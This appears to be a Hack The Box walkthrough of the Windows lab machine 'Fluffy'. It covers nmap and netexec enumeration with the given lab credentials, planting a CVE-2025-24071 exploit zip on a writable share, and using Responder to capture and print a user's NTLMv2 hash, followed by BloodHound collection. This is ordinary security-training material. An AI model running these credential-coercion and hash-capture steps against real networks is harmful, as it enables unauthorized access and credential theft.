---
title: Fluffy
date: 2025-7-14
categories: [HTB]
tags: [HTB]
---

![Machine Logo](https://labs.hackthebox.com/storage/avatars/ef8fc92ac7cccd8afa4412241432f064.png)

# ðŸ“¦ Box Info

| Box Name     | OS       | Difficulty | Status    | 
|--------------|----------|------------|-----------|
| Fluffy      | Windows  | Easy       | âœ… Done    |

As is common in real life Windows pentests, you will start the Fluffy box with credentials for the following account: `j.fleischman` / `J0elTHEM4n1990!`

# Recon
## Nmap

```
$: sudo nmap -v -A -p- $MACHIN_IP -oN ~/HTB/Fluffy/output_$MACHIN_IP.txt
Host is up (0.079s latency).
Not shown: 65516 filtered tcp ports (no-response)
PORT      STATE SERVICE       VERSION
53/tcp    open  domain        Simple DNS Plus
88/tcp    open  kerberos-sec  Microsoft Windows Kerberos (server time: 2025-07-17 15:07:44Z)
139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
389/tcp   open  ldap          Microsoft Windows Active Directory LDAP (Domain: fluffy.htb0., Site: Default-First-Site-Name)
| ssl-cert: Subject: commonName=DC01.fluffy.htb
| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1:<unsupported>, DNS:DC01.fluffy.htb
| Issuer: commonName=fluffy-DC01-CA
| Public Key type: rsa
| Public Key bits: 2048
| Signature Algorithm: sha256WithRSAEncryption
| Not valid before: 2025-04-17T16:04:17
| Not valid after:  2026-04-17T16:04:17
| MD5:   2765:a68f:4883:dc6d:0969:5d0d:3666:c880
|_SHA-1: 72f3:1d5f:e6f3:b8ab:6b0e:dd77:5414:0d0c:abfe:e681
|_ssl-date: 2025-07-17T15:09:18+00:00; +7h00m00s from scanner time.
445/tcp   open  microsoft-ds?
464/tcp   open  kpasswd5?
593/tcp   open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
636/tcp   open  ssl/ldap      Microsoft Windows Active Directory LDAP (Domain: fluffy.htb0., Site: Default-First-Site-Name)
|_ssl-date: 2025-07-17T15:09:19+00:00; +7h00m00s from scanner time.
| ssl-cert: Subject: commonName=DC01.fluffy.htb
| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1:<unsupported>, DNS:DC01.fluffy.htb
| Issuer: commonName=fluffy-DC01-CA
| Public Key type: rsa
| Public Key bits: 2048
| Signature Algorithm: sha256WithRSAEncryption
| Not valid before: 2025-04-17T16:04:17
| Not valid after:  2026-04-17T16:04:17
| MD5:   2765:a68f:4883:dc6d:0969:5d0d:3666:c880
|_SHA-1: 72f3:1d5f:e6f3:b8ab:6b0e:dd77:5414:0d0c:abfe:e681
3268/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: fluffy.htb0., Site: Default-First-Site-Name)
| ssl-cert: Subject: commonName=DC01.fluffy.htb
| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1:<unsupported>, DNS:DC01.fluffy.htb
| Issuer: commonName=fluffy-DC01-CA
| Public Key type: rsa
| Public Key bits: 2048
| Signature Algorithm: sha256WithRSAEncryption
| Not valid before: 2025-04-17T16:04:17
| Not valid after:  2026-04-17T16:04:17
| MD5:   2765:a68f:4883:dc6d:0969:5d0d:3666:c880
|_SHA-1: 72f3:1d5f:e6f3:b8ab:6b0e:dd77:5414:0d0c:abfe:e681
|_ssl-date: 2025-07-17T15:09:18+00:00; +7h00m00s from scanner time.
3269/tcp  open  ssl/ldap      Microsoft Windows Active Directory LDAP (Domain: fluffy.htb0., Site: Default-First-Site-Name)
| ssl-cert: Subject: commonName=DC01.fluffy.htb
| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1:<unsupported>, DNS:DC01.fluffy.htb
| Issuer: commonName=fluffy-DC01-CA
| Public Key type: rsa
| Public Key bits: 2048
| Signature Algorithm: sha256WithRSAEncryption
| Not valid before: 2025-04-17T16:04:17
| Not valid after:  2026-04-17T16:04:17
| MD5:   2765:a68f:4883:dc6d:0969:5d0d:3666:c880
|_SHA-1: 72f3:1d5f:e6f3:b8ab:6b0e:dd77:5414:0d0c:abfe:e681
|_ssl-date: 2025-07-17T15:09:19+00:00; +7h00m00s from scanner time.
5985/tcp  open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
9389/tcp  open  mc-nmf        .NET Message Framing
49667/tcp open  msrpc         Microsoft Windows RPC
49689/tcp open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
49690/tcp open  msrpc         Microsoft Windows RPC
49698/tcp open  msrpc         Microsoft Windows RPC
49703/tcp open  msrpc         Microsoft Windows RPC
49715/tcp open  msrpc         Microsoft Windows RPC
49734/tcp open  msrpc         Microsoft Windows RPC
Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
Device type: general purpose
Running (JUST GUESSING): Microsoft Windows 2019|10 (97%)
OS CPE: cpe:/o:microsoft:windows_server_2019 cpe:/o:microsoft:windows_10
Aggressive OS guesses: Windows Server 2019 (97%), Microsoft Windows 10 1903 - 21H1 (91%)
No exact OS matches for host (test conditions non-ideal).
Network Distance: 2 hops
TCP Sequence Prediction: Difficulty=254 (Good luck!)
IP ID Sequence Generation: Incremental
Service Info: Host: DC01; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
| smb2-security-mode: 
|   3:1:1: 
|_    Message signing enabled and required
|_clock-skew: mean: 6h59m59s, deviation: 0s, median: 6h59m59s
| smb2-time: 
|   date: 2025-07-17T15:08:42
|_  start_date: N/A

TRACEROUTE (using port 445/tcp)
HOP RTT      ADDRESS
1   80.69 ms 10.10.14.1
2   80.74 ms 10.129.185.163

NSE: Script Post-scanning.
Initiating NSE at 11:09
Completed NSE at 11:09, 0.00s elapsed
Initiating NSE at 11:09
Completed NSE at 11:09, 0.00s elapsed
Initiating NSE at 11:09
Completed NSE at 11:09, 0.00s elapsed
Read data files from: /usr/share/nmap
OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 248.00 seconds
           Raw packets sent: 131240 (5.778MB) | Rcvd: 153 (7.292KB)
```

Add `DC01.fluffy.htb` to `/etc/hosts`

```bash
$: sudo sed -i '/^127\.0\.1\.1.*/a $MACHIN_IP DC01.fluffy.htb fluffy.htb' /etc/hosts
```

##Netexec

Now letâ€™s perform enumeration using netexec with valid domain credentials.

> User Enumeration
```bash
$: netexec smb dc01.fluffy.htb -u "j.fleischman" -p 'J0elTHEM4n1990!' --users 
SMB         10.129.185.163  445    DC01             [*] Windows 10 / Server 2019 Build 17763 (name:DC01) (domain:fluffy.htb) (signing:True) (SMBv1:False) 
SMB         10.129.185.163  445    DC01             [+] fluffy.htb\j.fleischman:J0elTHEM4n1990! 
SMB         10.129.185.163  445    DC01             -Username-                    -Last PW Set-       -BadPW- -Description-                                   
SMB         10.129.185.163  445    DC01             Administrator                 2025-04-17 15:45:01 0       Built-in account for administering the computer/domain
SMB         10.129.185.163  445    DC01             Guest                         <never>             0       Built-in account for guest access to the computer/domain
SMB         10.129.185.163  445    DC01             krbtgt                        2025-04-17 16:00:02 0       Key Distribution Center Service Account 
SMB         10.129.185.163  445    DC01             ca_svc                        2025-04-17 16:07:50 0        
SMB         10.129.185.163  445    DC01             ldap_svc                      2025-04-17 16:17:00 0        
SMB         10.129.185.163  445    DC01             p.agila                       2025-04-18 14:37:08 0        
SMB         10.129.185.163  445    DC01             winrm_svc                     2025-05-18 00:51:16 0        
SMB         10.129.185.163  445    DC01             j.coffey                      2025-04-19 12:09:55 0        
SMB         10.129.185.163  445    DC01             j.fleischman                  2025-05-16 14:46:55 0        
SMB         10.129.185.163  445    DC01             [*] Enumerated 9 local users: FLUFFY
```

> Share Enumeration
```bash
$: netexec smb dc01.fluffy.htb -u "j.fleischman" -p 'J0elTHEM4n1990!' --shares
SMB         10.129.185.163  445    DC01             [*] Windows 10 / Server 2019 Build 17763 (name:DC01) (domain:fluffy.htb) (signing:True) (SMBv1:False) 
SMB         10.129.185.163  445    DC01             [+] fluffy.htb\j.fleischman:J0elTHEM4n1990! 
SMB         10.129.185.163  445    DC01             [*] Enumerated shares
SMB         10.129.185.163  445    DC01             Share           Permissions     Remark
SMB         10.129.185.163  445    DC01             -----           -----------     ------
SMB         10.129.185.163  445    DC01             ADMIN$                          Remote Admin
SMB         10.129.185.163  445    DC01             C$                              Default share
SMB         10.129.185.163  445    DC01             IPC$            READ            Remote IPC
SMB         10.129.185.163  445    DC01             IT              READ,WRITE      
SMB         10.129.185.163  445    DC01             NETLOGON        READ            Logon server share 
SMB         10.129.185.163  445    DC01             SYSVOL          READ            Logon server share
```

Weâ€™ve got `read/write` access on the `IT` share. While digging through `IT`, found a file named `Upgrade_Notice.pdf`

![Upgrade_Notice_PDF](/_imgs/Fluffy_img/pdf.png)

the target is actually vulnerable to CVE-2025-24071, so thatâ€™s our way in.

```bash
$: python3 poc.py 
Enter your file name: exploit.zip 
Enter IP (EX: 192.168.1.162): $tun0
completed
```
>  [CVE-2025-24071_PoC](https://github.com/0x6rss/CVE-2025-24071_PoC)

```bash
$: impacket-smbclient -dc-ip 10.129.185.163 fluffy.htb/j.fleischman:'J0elTHEM4n1990!'@dc01.fluffy.htb
Impacket v0.13.0.dev0 - Copyright Fortra, LLC and its affiliated companies 

Type help for list of commands
# use IT
# put exploit.zip
```

```bash
$: sudo responder -I tun0 -wd
[+] Listening for events...                                                                                                                                   

[SMB] NTLMv2-SSP Client   : 10.129.185.163
[SMB] NTLMv2-SSP Username : FLUFFY\p.agila
[SMB] NTLMv2-SSP Hash     : p.agila::FLUFFY:932035cbad09d47d:DB99091AF6B852CD6F9A0F977A0A61AD:010100000000000080B46C7F4BF7DB017AA871DC753AF9E300000000020008004D0036004300510001001E00570049004E002D004C004100480041005300550035004A0044004B00480004003400570049004E002D004C004100480041005300550035004A0044004B0048002E004D003600430051002E004C004F00430041004C00030014004D003600430051002E004C004F00430041004C00050014004D003600430051002E004C004F00430041004C000700080080B46C7F4BF7DB0106000400020000000800300030000000000000000100000000200000AF3A42C117E4B1B302FF1EA2976DCDDEE769EBE6E0B88C38AC7CA7B27CFC46B00A001000000000000000000000000000000000000900220063006900660073002F00310030002E00310030002E00310034002E003200310036000000000000000000 
```

## Bloodhound

```bash
$: bloodhound-python -u "j.fleischman" -p 'J0elTHEM4n1990!' -ns $MACHIN_IP -d fluffy.htb -c all
INFO: BloodHound.py for BloodHound LEGACY (BloodHound 4.2 and 4.3)
INFO: Found AD domain: fluffy.htb
INFO: Getting TGT for user
WARNING: Failed to get Kerberos TGT. Falling back to NTLM authentication. Error: Kerberos SessionError: KRB_AP_ERR_SKEW(Clock skew too great)
```

The KRB_AP_ERR_SKEW(Clock skew too great) error means thereâ€™s a big time difference between my machine and the server. The fix is to temporarily disable NTP, sync time with the server using rdate or ntpdate.

```bash
sudo su
timedatectl set-ntp false
rdate -n $MACHIN_IP
```